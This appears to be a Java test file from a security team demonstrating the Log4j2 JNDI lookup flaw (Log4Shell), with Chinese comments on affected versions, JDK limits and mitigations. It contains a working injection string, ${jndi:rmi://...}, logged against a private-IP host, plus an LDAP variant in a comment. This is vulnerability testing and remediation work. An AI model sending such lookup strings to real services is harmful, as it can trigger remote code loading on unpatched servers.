package com.ksyun.safe.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

// log4j2 支持JNDI
// https://logging.apache.org/log4j/2.x/manual/lookups.html

/**
 * 我测试的jdk版本1.8.0_181
 * 大于等于1.8.0_191就会不生效
 * 检查mvn dependency:tree -Dincludes=org.apache.logging.log4j输出中是否有log4j-core
 *
 * <groupId>org.apache.logging.log4j</groupId>
 * <artifactId>log4j-core</artifactId>
 * Java类产品：Apache Log4j  2.x < 2.15.0-rc2
 *
 * 低版本jdk补救
 * 1. 低于2.10的 请升级到2.14.1 然后执行步骤2
 * 2. 高于2.10的 在启动参数中加入 -Dlog4j2.formatMsgNoLookups=true
 *
 * 2021-12-11 目前看log4j2新的版本中添加了log4j2.enableJndi=false的新配置，默认是关闭了JNDI的代码
 *
 * https://github.com/zhangyoufu/log4j2-without-jndi
 * org/apache/logging/log4j/core/lookup/JndiLookup.class
 */


public class Log4jTest {
    private static final Logger LOGGER = LogManager.getLogger();
    public static void main(String[] args) {
        // 这里，什么都没有做，只是在打印日志
        LOGGER.error("LOOKUP: ${date:YYYY-MM-dd} ${java:os}");
        LOGGER.error("我要打印用户的请求：req:");
        // 恶意用户的请求是一段jndi RMI远程调用的string ${jndi:rmi://192.168.124.14:1099/shit}
        LOGGER.error("rmi 恶意代码 {}","${jndi:rmi://192.168.124.14:1099/shit}");

        // jndi ldap据说也可以${jndi:ldap://192.168.124.14:1098/shit}

    }
}
